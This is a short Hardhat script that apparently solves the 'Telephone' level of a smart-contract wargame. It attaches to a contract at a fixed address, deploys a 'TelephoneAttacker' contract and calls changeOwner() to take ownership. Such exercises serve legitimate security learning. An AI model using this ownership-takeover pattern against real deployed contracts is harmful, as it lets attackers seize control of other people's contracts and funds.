import { ethers } from "hardhat";

const CONTRACT_NAME = "Telephone";
const ATTACKER_NAME = "TelephoneAttacker";
const CONTRACT_ADDRESS = "0x30D6be66d5b76b7Bb3c95Eb84d2B4F0147353b38";

async function main() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(contract.address);
  await attackerContract.deployed();

  const tx = await attackerContract.changeOwner();
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
